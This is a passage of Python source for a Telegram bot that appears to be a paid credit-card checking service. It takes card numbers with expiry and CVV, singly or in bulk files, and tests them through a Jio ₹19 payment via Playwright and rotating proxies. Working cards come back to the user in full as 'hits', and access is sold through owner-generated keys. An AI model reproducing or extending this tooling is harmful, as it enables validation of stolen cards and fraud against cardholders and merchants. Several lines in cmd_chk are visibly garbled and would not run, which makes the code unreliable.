        f"║  ▸ `/botstats` — Stats\n"
        f"║  ▸ `/users` — User list\n"
        f"╠══════════════════════════════════╣\n"
        f"║  💎 **{OWNER_HANDLE}**\n"
        f"╚══════════════════════════════════╝"
    )

# ═══════════════════════════════════════════════════════════
# COMMANDS
# ═══════════════════════════════════════════════════════════
async def cmd_start(update, ctx):
    u = update.effective_user
    ensure_user(u.id, u.username or "")
    if is_banned(u.id):
        await update.message.reply_text("🚫 **You are banned.**", parse_mode="Markdown")
        return
    await update.message.reply_text(
        welcome_text(u, u.id),
        parse_mode="Markdown",
        reply_markup=main_menu_kb(u.id),
        disable_web_page_preview=True,
    )

async def cmd_menu(update, ctx):
    u = update.effective_user; ensure_user(u.id, u.username or "")
    await update.message.reply_text(
        f"💎 **{BOT_NAME} — MAIN MENU**",
        parse_mode="Markdown",
        reply_markup=main_menu_kb(u.id),
    )

async def cmd_help(update, ctx):
    await update.message.reply_text(
        help_text(), parse_mode="Markdown", reply_markup=back_kb())

async def cmd_myinfo(update, ctx):
    u = update.effective_user; ensure_user(u.id, u.username or "")
    await update.message.reply_text(
        user_card(get_user(u.id), u.id),
        parse_mode="Markdown", reply_markup=back_kb())

async def cmd_redeem(update, ctx):
    u = update.effective_user; ensure_user(u.id, u.username or "")
    if is_banned(u.id): await update.message.reply_text("🚫"); return
    if not ctx.args:
        await update.message.reply_text("⚠️ `/redeem KEY`", parse_mode="Markdown"); return
    ok, m = redeem_key(u.id, ctx.args[0].strip())
    await update.message.reply_text(m, parse_mode="Markdown")

async def cmd_feedback(update, ctx):
    u = update.effective_user; ensure_user(u.id, u.username or "")
    if not ctx.args:
        await update.message.reply_text("⚠️ `/feedback msg`"); return
    msg = " ".join(ctx.args)
    con = db(); cur = con.cursor()
    cur.execute("INSERT INTO feedback (user_id,username,message,created_at) VALUES (?,?,?,?)",
        (u.id, u.username or u.first_name, msg, int(time.time())))
    con.commit(); con.close()
    await update.message.reply_text("✅ Feedback sent 💎")
    try:
        await ctx.bot.send_message(OWNER_ID,
            f"📩 **Feedback**\n👤 `{u.id}` @{u.username or u.first_name}\n💬 {msg}",
            parse_mode="Markdown")
    except Exception: pass

def _parse_card_args(args):
    if not args: return None
    rest = " ".join(args); cp = None
    for sep in ["|","/"," "]:
        p = rest.split(sep)
        if len(p) >= 4: cp = p; break
    if not cp: return None
    mobile = cp[4].strip() if len(cp) >= 5 else ""
    return cp[0], cp[1], cp[2], cp[3], mobile

async def cmd_jio(update, ctx):
    u = update.effective_user; ensure_user(u.id, u.username or "")
    if is_banned(u.id): await update.message.reply_text("🚫"); return
    if not ctx.args:
        await update.message.reply_text(jio19_text(), parse_mode="Markdown",
            reply_markup=back_kb()); return
    if not has_access(u.id):
        await update.message.reply_text("🔑 No key. Contact " + OWNER_HANDLE); return
    parsed = _parse_card_args(ctx.args)
    if not parsed:
        await update.message.reply_text("⚠️ `/jio cc|mm|yy|cvv [mobile]`"); return
    if not consume_cc(u.id):
        await update.message.reply_text("💳 CC limit reached."); return
    cc, mm, yy, cvv, mobile = parsed
    masked = f"{cc[:6]}XXXXXX{cc[-4:]}"
    proxy = get_proxy() or "direct"
    proxy_disp = proxy.split("@")[-1].split("://")[-1] if proxy else "direct"
    live = LiveLogger(ctx.bot, update.effective_chat.id, masked, proxy_disp, max_lines=18)
    await live.log("Starting check", "🚀")
    r = await jio19_playwright(cc, mm, yy, cvv, mobile=mobile, proxy=proxy, log_cb=live.log)
    bump_live(u.id)
    if r["status"] in ("charged","approved"): bump_hit()
    elif r["status"] == "otp": bump_otp()
    elif r["status"] == "error": refund_cc(u.id)
    await live.finish(r["status"], r["response"], r["code"])

def parse_lines(lines):
    cards = []
    for line in lines:
        line = line.strip()
        if not line: continue
        for sep in ["|","/"," "]:
            p = line.split(sep)
            if len(p) >= 4: cards.append((p[0],p[1],p[2],p[3])); break
    return cards

async def cmd_chk(update, ctx):
    u = update.effective_user; ensure_user(u.id, u.username or "")
    if is_banned(u.id): await update.message.reply_text("🚫"); return
    if not has_access(u.id):
        await update.message.reply_text("🔑 No key."); return
    doc = update.message.document or (update.message.reply_to_message and update.message.reply_to_message.document)
    if not doc:
        await update.message.reply_text(chk_text(), parse_mode="Markdown"); return
    status = await update.message.reply_text("📂 Loading...")
    try:
        f = await ctx.bot.get_file(doc.file_id)
        lines = (await f.download_as_bytearray()).decode("utf-8", errors="ignore").splitlines()
        cards = parse_lines(lines)
    except Exception as e:
        await status.edit_text(f"⚠️ {e}"); return
    if not cards:
        await status.edit_text("⚠️ No cards."); return
    await status.delete()
    total = len(cards); start = time.time()
    counts = {"approved":0,"charged":0,"declined":0,"dead":0,"otp":0,"error":0,"limit":0}
    hits = []
    header = await update.message.reply_text(
        f"```\n╔══════════════════════════════════╗\n"
        f"║  🚀 MASS CHECK STARTED 💎\n"
        f"╠══════════════════════════════════╣split\n"
        f"║  📊 Total · {("total}\n"
        f"║  📱 Gate  · Jio ₹19\n"
        f"╚══════════════════════════════════╝\n```",
        parse_mode="Markdown")
    for idx, (cc,mm,yy,cvv) in enumerate(cards, 1):
        masked = f"{cc[:6]}XXXXXX{cc[-4:]}"
        if not consume_cc(u.id): counts["limit"] += 1; continue
        proxy = get_proxy() or "direct"
        proxy_disp = proxy.split("@")[-1].://")[-1] if proxy else "direct"
        live = LiveLogger(ctx.bot, update.effective_chat.id, masked, proxy_disp, max_lines=10)
        await live.log(f"Card {idx}/{total}", "🚀")
        r = await jio19_playwright(cc, mm, yy, cvv, proxy=proxy, log_cb=live.log)
        bump_live(u.id); st = r["status"]; counts[st] = counts.get(st,0)+1
        if st == "otp":
            bump_otp(); await live.finish("otp", r["response"], r["code"])
            await asyncio.sleep(0.5); continue
        if st in ("charged","approved"):
            bump_hit(); hits.append(f"{cc}|{mm}|{yy}|{cvv} — {st.upper()}")
        elif st == "error":
            refund_cc(u.id)
        await live.finish(st, r["response"], r["code"])
        await asyncio.sleep(0.5)
    summary = (
        f"```\n"
        f"╔══════════════════════════════════╗\n"
        f"║  🏁 MASS DONE 💎\n"
        f"╠══════════════════════════════════╣\n"
        f"║  📊 Total · {total}\n"
        f"║  🕒 Time  · {fmt_time(time.time()-start)}\n"
        f"╠══════════════════════════════════╣\n"
        f"║  💎 {counts['charged']} ✅ {counts['approved']} ❌ {counts['declined']}\n"
        f"║  ☠️ {counts['dead']} 🔐 {counts['otp']} ⚠️ {counts['error']}\n"
        f"║  ⛔ Limit · {counts['limit']}\n"
        f"╚══════════════════════════════════╝\n```"
    )
    await header.edit_text(summary, parse_mode="Markdown")
    if hits:
        hit_text = "\n".join(hits)
        await update.message.reply_text(
            f"💎 **{len(hits)} HITS**\n\n```\n{hit_text[:3500]}\n```",
            parse_mode="Markdown")

# ═══════════════════════════════════════════════════════════
# ADMIN
# ═══════════════════════════════════════════════════════════
async def cmd_genkey(update, ctx):
    u = update.effective_user
    if not is_admin(u.id): await update.message.reply_text("🚫"); return
    if len(ctx.args) < 3:
        await update.message.reply_text("⚠️ `/genkey <days> <uses> <cc_limit>`",
            parse_mode="Markdown"); return
    try: d,n,cl = int(ctx.args[0]),int(ctx.args[1]),int(ctx.args[2])
    except Exception: await update.message.reply_text("⚠️ ints only"); return
    k = gen_key(d,n,cl,u.id)
    await update.message.reply_text(
        f"🔑 **Key** 💎\n`{k}`\n▸ days `{d}` · uses `{n}` · cc `{cl}`",
        parse_mode="Markdown")

async def cmd_ban(update, ctx):
    u = update.effective_user
    if not is_admin(u.id): await update.message.reply_text("🚫"); return
    t = None
    if update.message.reply_to_message: t = update.message.reply_to_message.from_user.id
    elif ctx.args:
        try: t = int(ctx.args[0])
        except Exception: pass
    if not t: await update.message.reply_text("⚠️ reply or id"); return
    if is_owner(t): await update.message.reply_text("🚫"); return
    con = db(); cur = con.cursor()
    cur.execute("UPDATE users SET banned=1 WHERE user_id=?", (t,)); con.commit(); con.close()
    await update.message.reply_text(f"🚫 `{t}`", parse_mode="Markdown")

async def cmd_unban(update, ctx):
    u = update.effective_user
    if not is_admin(u.id): await update.message.reply_text("🚫"); return
    t = None
    if update.message.reply_to_message: t = update.message.reply_to_message.from_user.id
    elif ctx.args:
        try: t = int(ctx.args[0])
        except Exception: pass
    if not t: await update.message.reply_text("⚠️ reply or id"); return
    con = db(); cur = con.cursor()
    cur.execute("UPDATE users SET banned=0 WHERE user_id=?", (t,)); con.commit(); con.close()
    await update.message.reply_text(f"✅ `{t}`", parse_mode="Markdown")

async def cmd_botstats(update, ctx):
    u = update.effective_user
    if not is_admin(u.id): await update.message.reply_text("🚫"); return
    con = db(); cur = con.cursor()
    cur.execute("SELECT total_checks,total_hits,jio_checks,otp_count FROM stats WHERE id=1")
    tc,th,jio,otp = cur.fetchone()
    cur.execute("SELECT COUNT(*) FROM users"); uc = cur.fetchone()[0]
    cur.execute("SELECT COUNT(*) FROM users WHERE banned=1"); bc = cur.fetchone()[0]
    con.close()
    await update.message.reply_text(
        f"📊 **BOT STATS** 💎\n━━━━━━━━━━━━━━━━━\n"
        f"👥 Users · `{uc}` 🚫 `{bc}`\n"
        f"⚡ Total · `{tc}` 💎 `{th}`\n"
        f"📱 Jio   · `{jio}` 🔐 OTP `{otp}`\n"
        f"🤖 Bot   · `{bot_days_left()}`d",
        parse_mode="Markdown")

async def cmd_users(update, ctx):
    u = update.effective_user
    if not is_admin(u.id): await update.message.reply_text("🚫"); return
    con = db(); cur = con.cursor()
    cur.execute("SELECT user_id,username,banned,role,live_checks,lifetime FROM users ORDER BY first_seen DESC LIMIT 20")
    rows = cur.fetchall(); con.close()
    out = ["👥 **Recent Users** 💎","━━━━━━━━━━━━━━━━━"]
    for uid,un,bn,rl,lv,lf in rows:
        mark = "🚫" if bn else ("👑" if rl=="owner" else ("⭐" if rl=="admin" else "👤"))
        out.append(f"{mark} `{uid}` @{un or '-'} · L`{lv}` T`{lf}`")
    await update.message.reply_text("\n".join(out), parse_mode="Markdown")

async def cmd_feedbacklist(update, ctx):
    u = update.effective_user
    if not is_owner(u.id): await update.message.reply_text("🚫"); return
    con = db(); cur = con.cursor()
    cur.execute("SELECT user_id,username,message,created_at FROM feedback ORDER BY id DESC LIMIT 10")
    rows = cur.fetchall(); con.close()
    if not rows: await update.message.reply_text("📭 Empty."); return
    out = ["📩 **Last 10 Feedback** 💎","━━━━━━━━━━━━━━━━━"]
    for uid,un,m,ts in rows:
        out.append(f"👤 `{uid}` @{un}\n💬 {m}\n🕒 {datetime.fromtimestamp(ts).strftime('%Y-%m-%d %H:%M')}")
        out.append("━━━━━━━━━━━━━━━━━")
    await update.message.reply_text("\n".join(out), parse_mode="Markdown")

# ═══════════════════════════════════════════════════════════
# CALLBACKS
# ═══════════════════════════════════════════════════════════
async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; await q.answer()
    d = q.data; uid = q.from_user.id
    ensure_user(uid, q.from_user.username or "")

    if d == "ui_main":
        await q.edit_message_text(f"💎 **{BOT_NAME} — MAIN MENU**",
            parse_mode="Markdown", reply_markup=main_menu_kb(uid))
    elif d == "ui_info":
        await q.edit_message_text(user_card(get_user(uid), uid),
            parse_mode="Markdown", reply_markup=back_kb())
    elif d == "ui_jio19":
        await q.edit_message_text(jio19_text(), parse_mode="Markdown", reply_markup=back_kb())
    elif d == "ui_chk":
        await q.edit_message_text(chk_text(), parse_mode="Markdown", reply_markup=back_kb())
    elif d == "ui_help":
        await q.edit_message_text(help_text(), parse_mode="Markdown", reply_markup=back_kb())
    elif d == "ui_redeem":
        await q.edit_message_text(f"🔑 **REDEEM**\n\n`/redeem YOUR-KEY`",
            parse_mode="Markdown", reply_markup=back_kb())
    elif d == "ui_fb":
        await q.edit_message_text(f"💬 **FEEDBACK**\n\n`/feedback msg`",
            parse_mode="Markdown", reply_markup=back_kb())
    elif d == "ui_stats":
        con = db(); cur = con.cursor()
        cur.execute("SELECT total_checks,total_hits,jio_checks,otp_count FROM stats WHERE id=1")
        tc,th,jio,otp = cur.fetchone(); con.close()
        u = get_user(uid)
        await q.edit_message_text(
            f"📊 **Stats** 💎\n━━━━━━━━━━━━━━━━━\n"
            f"👤 Your Live · `{u['live_checks'] if u else 0}`\n"
            f"📊 Your Life · `{u['lifetime'] if u else 0}`\n"
            f"⚡ Bot Total · `{tc}`\n"
            f"💎 Hits      · `{th}`\n"
            f"📱 Jio       · `{jio}`\n"
            f"🔐 OTP       · `{otp}`\n"
            f"🤖 Bot Life  · `{bot_days_left()}`d",
            parse_mode="Markdown", reply_markup=back_kb())
    elif d == "ui_admin":
        if uid != OWNER_ID and not is_admin(uid):
            await q.answer("Not allowed", show_alert=True); return
        await q.edit_message_text(f"👑 **ADMIN PANEL**\n\nWelcome, Boss 💎",
            parse_mode="Markdown", reply_markup=admin_menu_kb())
    elif d == "ad_genkey":
        await q.edit_message_text(
            f"🔑 `/genkey <days> <uses> <cc_limit>`\n\nExample:\n`/genkey 30 10 100`",
            parse_mode="Markdown", reply_markup=back_kb("ui_admin"))
    elif d == "ad_stats":
        await q.edit_message_text("📊 Use `/botstats`",
            parse_mode="Markdown", reply_markup=back_kb("ui_admin"))
    elif d == "ad_users":
        await q.edit_message_text("👥 Use `/users`",
            parse_mode="Markdown", reply_markup=back_kb("ui_admin"))
    elif d == "ad_fb":
        await q.edit_message_text("📩 Use `/feedbacklist`",
            parse_mode="Markdown", reply_markup=back_kb("ui_admin"))

# ═══════════════════════════════════════════════════════════
# GENERIC MESSAGE
# ═══════════════════════════════════════════════════════════
async def on_message(update, ctx):
    if not update.message or not update.message.text: return
    if update.message.text.startswith("/"): return
    u = update.effective_user; ensure_user(u.id, u.username or "")
    if is_banned(u.id): return
    if not has_access(u.id): return
    raw = update.message.text.strip(); cp = None
    for sep in ["|","/"," "]:
        p = raw.split(sep)
        if len(p) >= 4: cp = p; break
    if not cp: return
    if not consume_cc(u.id):
        await update.message.reply_text("💳 Limit."); return
    cc,mm,yy,cvv = cp[0],cp[1],cp[2],cp[3]
    masked = f"{cc[:6]}XXXXXX{cc[-4:]}"
    proxy = get_proxy() or "direct"
    proxy_disp = proxy.split("@")[-1].split("://")[-1] if proxy else "direct"
    live = LiveLogger(ctx.bot, update.effective_chat.id, masked, proxy_disp, max_lines=18)
    await live.log("Starting", "🚀")
    r = await jio19_playwright(cc,mm,yy,cvv, proxy=proxy, log_cb=live.log)
    bump_live(u.id)
    if r["status"] in ("charged","approved"): bump_hit()
    elif r["status"] == "otp": bump_otp()
    elif r["status"] == "error": refund_cc(u.id)
    await live.finish(r["status"], r["response"], r["code"])

# ═══════════════════════════════════════════════════════════
# BOOT
# ═══════════════════════════════════════════════════════════
def run_api():
    uvicorn.run(api_app, host="0.0.0.0", port=PORT, log_level="warning")

def main():
    db_init()
    ensure_user(OWNER_ID, "whoh4rsh")
    con = db(); cur = con.cursor()
    cur.execute("UPDATE users SET role='owner' WHERE user_id=?", (OWNER_ID,))
    con.commit(); con.close()

    logger.info(f"🔍 Browser path: {get_browser_path()}")
    logger.info(f"🔍 HEADLESS: {HEADLESS}")
    logger.info(f"🔍 PORT: {PORT}")

    Thread(target=run_api, daemon=True).start()

    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("menu", cmd_menu))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("myinfo", cmd_myinfo))
    app.add_handler(CommandHandler("redeem", cmd_redeem))
    app.add_handler(CommandHandler("feedback", cmd_feedback))
    app.add_handler(CommandHandler("jio", cmd_jio))
    app.add_handler(CommandHandler("chk", cmd_chk))
    app.add_handler(CommandHandler("genkey", cmd_genkey))
    app.add_handler(CommandHandler("ban", cmd_ban))
    app.add_handler(CommandHandler("unban", cmd_unban))
    app.add_handler(CommandHandler("botstats", cmd_botstats))
    app.add_handler(CommandHandler("users", cmd_users))
    app.add_handler(CommandHandler("feedbacklist", cmd_feedbacklist))
    app.add_handler(CallbackQueryHandler(on_callback))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), on_message))

    logger.info(f"🚀 {BOT_NAME} starting (Railway)...")
    app.run_polling()

if __name__ == "__main__":
    main()
